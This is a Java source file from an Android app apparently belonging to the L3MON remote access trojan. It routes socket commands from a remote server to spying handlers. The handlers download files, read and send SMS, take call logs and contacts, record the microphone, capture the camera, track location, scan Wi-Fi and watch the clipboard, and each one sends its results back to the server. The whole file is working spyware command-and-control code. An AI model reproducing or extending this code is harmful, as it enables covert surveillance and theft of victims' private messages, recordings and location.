package com.etechd.l3mon.core.network;

import android.os.Looper;
import android.util.Log;

import com.etechd.l3mon.core.L3monApp;
import com.etechd.l3mon.core.permissions.PermissionManager;
import com.etechd.l3mon.features.apps.AppList;
import com.etechd.l3mon.features.camera.CameraManager;
import com.etechd.l3mon.features.clipboard.ClipboardMonitor;
import com.etechd.l3mon.features.location.LocManager;
import com.etechd.l3mon.features.mic.MicManager;
import com.etechd.l3mon.features.sms.SMSManager;
import com.etechd.l3mon.features.calls.CallsManager;
import com.etechd.l3mon.features.contacts.ContactsManager;
import com.etechd.l3mon.features.storage.FileManager;
import com.etechd.l3mon.features.wifi.WifiScanner;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import io.socket.client.Socket;

public final class SocketCommandRouter {

    private static final String TAG = "SocketCommandRouter";
    private static final FileManager FILE_MANAGER = new FileManager();
    private static final CameraManager CAMERA_MANAGER = new CameraManager(L3monApp.getContext());
    private static final ExecutorService BACKGROUND_EXECUTOR = Executors.newFixedThreadPool(2, runnable -> {
        Thread thread = new Thread(runnable, "L3monSocketWorker");
        thread.setDaemon(true);
        return thread;
    });
    private static boolean initialized;

    private SocketCommandRouter() {
    }

    public static synchronized void initialize() {
        if (initialized) {
            return;
        }
        try {
            setupListeners();
            initialized = true;
        } catch (Exception ex) {
            Log.e(TAG, "Failed to initialize socket listeners", ex);
        }
    }

    private static void setupListeners() {
        final var socket = SocketClient.getInstance().getSocket();
        if (socket == null) {
            Log.e(TAG, "Socket instance is null");
            return;
        }

        socket.on("ping", args -> socket.emit("pong"));

        socket.on("order", args -> {
            try {
                if (args.length == 0 || !(args[0] instanceof JSONObject)) {
                    return;
                }
                JSONObject data = (JSONObject) args[0];
                String order = data.optString("type", "");

                switch (order) {
                    case "0xFI":
                        handleFileInteraction(data);
                        break;
                    case "0xSM":
                        handleSms(data);
                        break;
                    case "0xCL":
                        executeAndEmit("0xCL", CallsManager::getCallsLogs);
                        break;
                    case "0xCO":
                        executeAndEmit("0xCO", ContactsManager::getContacts);
                        break;
                    case "0xMI":
                        MicManager.startRecording(data.optInt("sec", 0));
                        break;
                    case "0xLO":
                        emitLocation();
                        break;
                    case "0xWI":
                        executeAndEmit("0xWI", () -> WifiScanner.scan(L3monApp.getContext()));
                        break;
                    case "0xPM":
                        executeAndEmit("0xPM", PermissionManager::getGrantedPermissions);
                        break;
                    case "0xIN":
                        handleInstalledAppsCommand(data);
                        break;
                    case "0xGP":
                        executeAndEmit("0xGP", () -> buildPermissionStatus(data.optString("permission", "")));
                        break;
                    case "0xCA":
                        handleCameraCommand(data);
                        break;
                    case "0xCB":
                        handleClipboardCommand(data);
                        break;
                    default:
                        Log.w(TAG, "Unknown order: " + order);
                        break;
                }
            } catch (Exception e) {
                Log.e(TAG, "Error handling socket order", e);
            }
        });

        socket.connect();
    }

    private static void handleFileInteraction(JSONObject data) throws JSONException {
        String action = data.optString("action");
        String path = data.optString("path", "");
        
        try {
            switch (action) {
                case "ls":
                    JSONObject listPayload = new JSONObject();
                    listPayload.put("type", "list");
                    listPayload.put("list", FILE_MANAGER.walk(path));
                    listPayload.put("path", path);
                    SocketClient.getInstance().getSocket().emit("0xFI", listPayload);
                    break;
                case "dl":
                    // Execute download in background thread to prevent blocking
                    BACKGROUND_EXECUTOR.execute(() -> {
                        try {
                            FILE_MANAGER.downloadFile(path);
                        } catch (Exception e) {
                            Log.e(TAG, "Error in file download background task", e);
                            // Send error back to server
                            try {
                                JSONObject errorJson = new JSONObject();
                                errorJson.put("type", "error");
                                errorJson.put("error", "Download failed: " + e.getMessage());
                                errorJson.put("path", path);
                                SocketClient.getInstance().getSocket().emit("0xFI", errorJson);
                            } catch (JSONException jsonE) {
                                Log.e(TAG, "Failed to send error message", jsonE);
                            }
                        }
                    });
                    break;
                default:
                    Log.w(TAG, "Unsupported file interaction action: " + action);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling file interaction: " + action, e);
            // Send error response
            JSONObject errorResponse = new JSONObject();
            errorResponse.put("type", "error");
            errorResponse.put("error", "File operation failed: " + e.getMessage());
            if (path != null && !path.isEmpty()) {
                errorResponse.put("path", path);
            }
            SocketClient.getInstance().getSocket().emit("0xFI", errorResponse);
        }
    }

    private static void handleSms(JSONObject data) {
        String action = data.optString("action");
        switch (action) {
            case "ls":
                BACKGROUND_EXECUTOR.execute(() -> {
                    try {
                        JSONObject payload = SMSManager.getsms();
                        Socket socket = SocketClient.getInstance().getSocket();
                        if (socket != null) {
                            socket.emit("0xSM", payload);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to emit SMS list", e);
                        try {
                            JSONObject errorPayload = new JSONObject();
                            errorPayload.put("error", "Failed to fetch SMS: " + e.getMessage());
                            Socket socket = SocketClient.getInstance().getSocket();
                            if (socket != null) {
                                socket.emit("0xSM", errorPayload);
                            }
                        } catch (JSONException jsonException) {
                            Log.e(TAG, "Failed to build SMS error payload", jsonException);
                        }
                    }
                });
                break;
            case "sendSMS":
                BACKGROUND_EXECUTOR.execute(() -> {
                    boolean sent = SMSManager.sendSMS(data.optString("to", ""), data.optString("sms", ""));
                    Socket socket = SocketClient.getInstance().getSocket();
                    if (socket != null) {
                        socket.emit("0xSM", sent);
                    }
                });
                break;
            default:
                Log.w(TAG, "Unsupported SMS action: " + action);
        }
    }

    private static void handleCameraCommand(JSONObject data) {
        String action = data.optString("action");
        switch (action) {
            case "list":
                JSONObject cameras = CAMERA_MANAGER.findCameraList();
                if (cameras == null) {
                    emitEmptyCameraList();
                } else {
                    SocketClient.getInstance().getSocket().emit("0xCA", cameras);
                }
                break;
            case "capture":
                CAMERA_MANAGER.startUp(data.optInt("id", 0));
                break;
            default:
                Log.w(TAG, "Unsupported camera action: " + action);
                break;
        }
    }

    private static void handleClipboardCommand(JSONObject data) {
        ClipboardMonitor monitor = ClipboardMonitor.getInstance(L3monApp.getContext());
        String action = data.optString("action", "fetch");

        switch (action) {
            case "start":
                monitor.start();
                BACKGROUND_EXECUTOR.execute(monitor::emitClipboardSnapshot);
                break;
            case "stop":
                monitor.stop();
                break;
            case "fetch":
            default:
                BACKGROUND_EXECUTOR.execute(monitor::emitClipboardSnapshot);
                break;
        }
    }

    private static void emitEmptyCameraList() {
        try {
            JSONObject payload = new JSONObject();
            payload.put("camList", true);
            payload.put("list", new JSONArray());
            payload.put("message", "No cameras detected");
            SocketClient.getInstance().getSocket().emit("0xCA", payload);
        } catch (JSONException e) {
            Log.e(TAG, "Failed to emit empty camera list", e);
        }
    }

    private static void emitLocation() {
        try {
            if (Looper.myLooper() == null) {
                Looper.prepare();
            }
            LocManager gps = new LocManager(L3monApp.getContext());
            if (gps.canGetLocation()) {
                executeAndEmit("0xLO", gps::getData);
            }
        } catch (Exception e) {
            Log.e(TAG, "Location emit error", e);
        }
    }

    private static JSONObject buildPermissionStatus(String permission) throws JSONException {
        JSONObject data = new JSONObject();
        data.put("permission", permission);
        data.put("isAllowed", PermissionManager.canIUse(permission));
        return data;
    }

    private static void handleInstalledAppsCommand(JSONObject data) {
        boolean includeSystem = data.optBoolean("includeSystem", true);
        executeAndEmit("0xIN", () -> AppList.getInstalledApps(includeSystem));
    }

    private static void executeAndEmit(String channel, Callable<Object> task) {
        BACKGROUND_EXECUTOR.execute(() -> {
            try {
                Object payload = task.call();
                Socket socket = SocketClient.getInstance().getSocket();
                if (socket != null) {
                    socket.emit(channel, payload);
                }
            } catch (Exception e) {
                Log.e(TAG, "Failed to emit " + channel, e);
            }
        });
    }
}
